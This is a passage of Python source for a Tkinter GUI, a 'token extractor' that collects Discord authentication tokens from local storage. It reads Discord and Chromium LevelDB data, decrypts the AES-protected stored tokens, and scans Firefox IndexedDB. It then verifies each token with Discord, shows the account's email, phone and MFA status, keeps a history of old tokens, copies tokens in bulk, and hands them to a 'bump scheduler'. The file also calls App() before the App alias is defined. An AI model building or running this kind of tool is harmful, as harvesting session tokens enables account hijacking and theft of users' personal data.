            ("username",    "Username",      180),
            ("uid",         "User ID",       160),
            ("source",      "Last Found In", 200),
            ("first_seen",  "First Seen",    110),
            ("last_seen",   "Last Seen",     110),
            ("prev_tokens", "Old Tokens",     80),
        ]:
            self._htree.heading(col, text=head)
            self._htree.column(col, width=w, minwidth=30)
        self._htree.tag_configure("active", foreground=GREEN)

        vsb = ttk.Scrollbar(tf, orient="vertical", command=self._htree.yview)
        self._htree.configure(yscrollcommand=vsb.set)
        self._htree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        self._htree.bind("<<TreeviewSelect>>", self._hist_on_sel)

        # Token preview strip
        hb = tk.Frame(parent, bg=CARD,
                      highlightthickness=1, highlightbackground=BORDER)
        hb.pack(fill="x", padx=10, pady=(0,8))
        self._hlbl = tk.Label(hb, text="Select a row to preview its token",
                               font=F_MONO, fg=TEXT2, bg=CARD,
                               anchor="w", padx=10, pady=8)
        self._hlbl.pack(side="left", fill="x", expand=True)
        tk.Button(hb, text="Copy",
                  command=self._hist_copy,
                  bg=ACCENT, fg=WHITE, relief="flat",
                  font=F_SMALL, cursor="hand2",
                  padx=8).pack(side="right", padx=8, pady=6)

    def _refresh_history_tab(self):
        for i in self._htree.get_children():
            self._htree.delete(i)
        for uid, e in self.history.items():
            n = len(e.get("token_history", []))
            self._htree.insert("", "end", iid=uid,
                values=(
                    (e.get("username","") + e.get("tag","")),
                    uid,
                    e.get("source",""),
                    e.get("first_seen","")[:10],
                    e.get("last_seen","")[:10],
                    str(n) if n else "—",
                ), tags=("active",))

    def _hist_on_sel(self, _=None):
        sel = self._htree.selection()
        if not sel: return
        e = self.history.get(sel[0])
        if not e: return
        tok = e.get("token","")
        preview = tok[:50] + "…" if len(tok) > 50 else tok
        self._hlbl.config(text=preview, fg=TEXT)

    def _hist_copy(self):
        sel = self._htree.selection()
        if not sel:
            messagebox.showinfo("Select a row",
                                "Click a row in the history table first.")
            return
        lines = []
        for uid in sel:
            e = self.history.get(uid)
            if e:
                name = e.get("username","") + e.get("tag","")
                lines.append(f"{name}: {e.get('token','')}")
        if copy_text("\n".join(lines)):
            self._status(f"✓ {len(lines)} token(s) copied from history!", GREEN)

    def _hist_delete(self):
        sel = self._htree.selection()
        if not sel:
            messagebox.showinfo("Select rows",
                                "Select one or more rows to delete.")
            return
        names = [self.history[uid].get("username","?")
                 for uid in sel if uid in self.history]
        if not messagebox.askyesno(
            "Confirm Delete",
            f"Permanently delete {len(sel)} entry/entries?\n\n"
            + "\n".join(f"  • {n}" for n in names[:10])
        ):
            return
        for uid in sel:
            self.history.pop(uid, None)
        save_history(self.history)
        self._refresh_history_tab()
        self._status(f"✓ {len(sel)} deleted from history.", YELLOW)

    # ── Scan worker ───────────────────────────────────────────────────────────

    def _start_scan(self):
        if self._scan_running:
            return
        self._scan_running = True
        self._btn_scan.config(state="disabled", text="Scanning…")
        self._status("Scanning… please wait", YELLOW)
        for i in self._tree.get_children():
            self._tree.delete(i)
        self._checked.clear()
        self.accounts.clear()
        self._lbl_count.config(text="")
        self._empty_lbl.config(text="\n\n  🔍  Scanning…")
        self._empty_lbl.pack(fill="both", expand=True)
        threading.Thread(target=self._scan_worker, daemon=True).start()

    def _scan_worker(self):
        locations = list(all_scan_locations())
        total     = len(locations)

        # Phase 1: collect all tokens, track every source per token
        # tok → {sources: [(label, method), ...]}
        tok_sources: dict[str, list[tuple[str,str]]] = {}

        for idx, (method, label, path, ls) in enumerate(locations, 1):
            self.root.after(0, self._status,
                            f"[{idx}/{total}]  {label}  ({method})", YELLOW)
            try:
                found = extract_tokens(method, path, ls)
            except Exception:
                found = set()

            for tok in found:
                tok_sources.setdefault(tok, []).append((label, method))

        unique_tokens = list(tok_sources.keys())
        self.root.after(0, self._status,
                        f"Found {len(unique_tokens)} unique token(s) — "
                        f"verifying with Discord…", CYAN)

        # Phase 2: verify each unique token once, then deduplicate by user ID.
        # If two different tokens belong to the same user ID, keep the one
        # that was verified most recently (i.e. we pick one canonical entry
        # per account).  All sources are merged into a single row.

        # uid → entry (the canonical one we'll show)
        uid_to_entry: dict[str, dict] = {}
        # token → entry (for invalid tokens with no uid)
        tok_to_entry: dict[str, dict] = {}

        for tok in unique_tokens:
            sources = tok_sources[tok]
            # Merge all source labels + pick best method label
            source_str  = ", ".join(dict.fromkeys(s for s,_ in sources))
            method_str  = sources[0][1]   # method of first find

            info   = fetch_user_info(tok)
            status = "ok" if info else "invalid"
            uid    = (info or {}).get("id", "")

            if uid and uid in uid_to_entry:
                # Same account already has an entry — just add sources
                existing = uid_to_entry[uid]
                # Merge sources (avoid duplicates)
                existing_srcs = set(existing["source"].split(", "))
                new_srcs = set(source_str.split(", "))
                existing["source"] = ", ".join(sorted(existing_srcs | new_srcs))
                # Update token only if this one is newer / different
                continue

            entry = {
                "token":   tok,
                "source":  source_str,
                "method":  method_str,
                "status":  status,
                "info":    info,
            }

            if uid:
                uid_to_entry[uid] = entry
                # Update history
                changed = history_upsert(
                    self.history, uid, tok, info, source_str)
                if changed:
                    save_history(self.history)
            else:
                tok_to_entry[tok] = entry

        # Phase 3: build final account list
        # Valid accounts first (deduplicated by UID), then invalids
        self.accounts = list(uid_to_entry.values()) + list(tok_to_entry.values())

        # Add all rows to GUI
        for entry in self.accounts:
            self.root.after(0, self._add_final_row, entry)

        if self.accounts:
            self.root.after(0, self._empty_lbl.pack_forget)

        valid_count = len(uid_to_entry)
        self.root.after(0, self._status,
                        f"✓ Done — {valid_count} unique account(s) found  "
                        f"(+ {len(tok_to_entry)} invalid)  "
                        f"(scanned {total} locations)", GREEN)
        self.root.after(0, self._btn_scan.config,
                        {"state":"normal", "text":"↺  Rescan"})
        self.root.after(0, self._refresh_history_tab)
        self.root.after(0, self._apply_filter)
        self._scan_running = False

    # ── Table row management ──────────────────────────────────────────────────

    _METHOD_LABEL = {
        "discord":         "M1+M2",
        "chromium":        "M1+M3",
        "firefox_idb":     "M6",
        "firefox_storage": "M6",
    }

    def _add_final_row(self, entry: dict):
        """Add a completed, verified entry to the tree."""
        iid  = str(id(entry))
        entry["iid"] = iid
        info = entry.get("info")
        ml   = self._METHOD_LABEL.get(entry.get("method",""), "M1")

        if info:
            name   = info.get("global_name") or info.get("username","?")
            disc   = info.get("discriminator","0")
            tag    = f"#{disc}" if disc != "0" else ""
            uid    = info.get("id","")
            mfa    = "🔐" if info.get("mfa_enabled") else ""
            nitro  = "✨" if info.get("premium_type",0) > 0 else ""
            badges = "  ".join(filter(None,[mfa,nitro])) or "—"
            # Truncate source if it lists many places
            src_display = entry["source"]
            if len(src_display) > 40:
                parts = src_display.split(", ")
                src_display = parts[0] + f" +{len(parts)-1} more"
            self._tree.insert("", "end", iid=iid,
                values=("□", f"{name}{tag}", uid,
                        ml, src_display, "✓ Valid", badges),
                tags=("ok",))
        else:
            self._tree.insert("", "end", iid=iid,
                values=("□", "Invalid / Expired", "",
                        ml, entry["source"][:40], "✗ Invalid", ""),
                tags=("invalid",))

    def _apply_filter(self):
        """Show/hide rows based on current filter selection."""
        f = self._filter_var.get()
        # Detach all, then re-attach matching ones
        for iid in self._tree.get_children():
            self._tree.detach(iid)

        shown = 0
        for entry in self.accounts:
            iid = entry.get("iid")
            if not iid:
                continue
            status = entry.get("status","")
            if f == "all" or (f == "valid" and status == "ok") or \
               (f == "invalid" and status == "invalid"):
                self._tree.reattach(iid, "", "end")
                shown += 1

        total   = len(self.accounts)
        valid   = sum(1 for e in self.accounts if e.get("status") == "ok")
        invalid = total - valid
        self._lbl_count.config(
            text=f"{valid} valid  ·  {invalid} invalid  ·  showing {shown}")

        # Empty state
        if shown == 0:
            self._empty_lbl.config(
                text="\n\n  No accounts match this filter.")
            self._empty_lbl.pack(fill="both", expand=True)
        else:
            self._empty_lbl.pack_forget()

    # ── Checkbox ──────────────────────────────────────────────────────────────

    def _on_click(self, event):
        iid = self._tree.identify_row(event.y)
        if not iid: return
        if iid in self._checked: self._checked.discard(iid)
        else:                     self._checked.add(iid)
        self._refresh_chk(iid)
        self._upd_sel_lbl()

    def _refresh_chk(self, iid):
        v = list(self._tree.item(iid,"values"))
        v[0] = "☑" if iid in self._checked else "□"
        self._tree.item(iid, values=v)

    def _sel_all(self):
        for iid in self._tree.get_children():
            self._checked.add(iid); self._refresh_chk(iid)
        self._upd_sel_lbl()

    def _sel_none(self):
        for iid in self._tree.get_children():
            self._checked.discard(iid); self._refresh_chk(iid)
        self._upd_sel_lbl()

    def _upd_sel_lbl(self):
        n = len(self._checked)
        self._lbl_sel.config(
            text=f"{n} selected" if n else "No accounts selected")

    # ── Detail panel ──────────────────────────────────────────────────────────

    _METHOD_DESC = {
        "discord":         "M1+M2 · LevelDB plaintext + Discord dQw4w9 AES decryption",
        "chromium":        "M1+M3 · LevelDB plaintext + Chromium v10 AES-GCM decryption",
        "firefox_idb":     "M6 · Firefox IndexedDB sqlite scan",
        "firefox_storage": "M6 · Firefox storage directory scan",
    }

    def _on_sel(self, _=None):
        sel = self._tree.selection()
        if not sel: return
        entry = next((e for e in self.accounts if e.get("iid")==sel[0]), None)
        if not entry: return
        info = entry.get("info") or {}
        name   = info.get("global_name") or info.get("username","—")
        disc   = info.get("discriminator","0")
        tag    = f"#{disc}" if disc != "0" else ""
        badges = []
        if info.get("mfa_enabled"):    badges.append("🔐 MFA")
        if info.get("premium_type",0): badges.append("✨ Nitro")
        nitro_map = {0:"None",1:"Classic",2:"Boost",3:"Basic"}

        self._d_name.config(text=name)
        self._d_tag.config(text=f"@{name}{tag}" if name != "—" else "")
        self._d_badge.config(text="  ".join(badges))
        self._av.delete("ini")
        self._av.create_text(26, 26,
            text=(name[0].upper() if name and name!="—" else "?"),
            fill=WHITE, font=("Segoe UI",18,"bold"), tags="ini")

        self._di_uid.config(text=info.get("id","—"))
        self._di_email.config(text=info.get("email") or "—")
        self._di_phone.config(text=info.get("phone") or "—")
        self._di_mfa.config(text="Enabled" if info.get("mfa_enabled") else "Disabled",
                             fg=GREEN if info.get("mfa_enabled") else TEXT3)
        self._di_nitro.config(
            text=nitro_map.get(info.get("premium_type",0),"None"),
            fg=CYAN if info.get("premium_type",0) else TEXT3)
        self._di_locale.config(text=info.get("locale","—"))
        self._di_method.config(text=entry.get("method","—"))
        self._di_source.config(text=entry["source"])
        self._tok_var.set(entry["token"])
        self._show = False
        self._tok_entry.config(show="•")
        self._b_eye.config(fg=TEXT2)
        self._lbl_method_info.config(
            text=self._METHOD_DESC.get(entry.get("method",""),""))

    def _eye(self):
        self._show = not self._show
        self._tok_entry.config(show="" if self._show else "•")
        self._b_eye.config(fg=ACCENT if self._show else TEXT2)

    # ── Copy ──────────────────────────────────────────────────────────────────

    def _status(self, msg, color=TEXT2):
        self._lbl_scan.config(text=msg, fg=color)

    def _copy_one(self, tok):
        if tok and copy_text(tok):
            self._status("✓ Token copied!", GREEN)

    def _copy_all(self):
        # Deduplicate by token value (same token in multiple profiles = once)
        seen: set[str] = set()
        tokens = []
        for e in self.accounts:
            if e["status"] == "ok" and e["token"] not in seen:
                seen.add(e["token"])
                tokens.append(e["token"])
        if not tokens:
            messagebox.showinfo("None","No valid tokens yet."); return
        if copy_text("\n".join(tokens)):
            self._status(f"✓ {len(tokens)} unique token(s) copied!", GREEN)

    def _copy_sel(self):
        seen: set[str] = set()
        lines = []
        for iid in self._checked:
            e = next((x for x in self.accounts if x.get("iid")==iid), None)
            if e and e["token"] not in seen:
                seen.add(e["token"])
                lines.append(e["token"])
        if not lines:
            messagebox.showinfo("Nothing selected","Check accounts first."); return
        if copy_text("\n".join(lines)):
            self._status(f"✓ {len(lines)} token(s) copied!", GREEN)

    def _copy_named(self):
        seen: set[str] = set()
        lines = []
        for i, iid in enumerate(self._checked, 1):
            e = next((x for x in self.accounts if x.get("iid")==iid), None)
            if e and e["token"] not in seen:
                seen.add(e["token"])
                info = e.get("info") or {}
                name = info.get("global_name") or info.get("username","Unknown")
                lines.append(f"{i}. {name}: {e['token']}")
        if not lines:
            messagebox.showinfo("Nothing selected","Check accounts first."); return
        if copy_text("\n".join(lines)):
            self._status(f"✓ {len(lines)} named token(s) copied!", GREEN)

    def _use_token(self):
        """Send selected (or clicked) token back to bump scheduler."""
        # Prefer the detail panel token if one is shown
        tok = self._tok_var.get().strip() if hasattr(self, "_tok_var") else ""
        username = "Unknown"

        if not tok:
            # Fall back to first checked account
            for iid in self._checked:
                e = next((x for x in self.accounts if x.get("iid") == iid), None)
                if e and e.get("status") == "ok":
                    tok      = e["token"]
                    info     = e.get("info") or {}
                    username = info.get("global_name") or info.get("username", "Unknown")
                    break

        if not tok:
            messagebox.showinfo("No Token Selected",
                "Click on an account row to select it, or check the box next to it.",
                parent=self._window)
            return

        if self._on_use_token:
            self._on_use_token(tok, username)
        self._window.destroy()

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    App().run()

# Alias for standalone use
App = TokenExtractorWindow
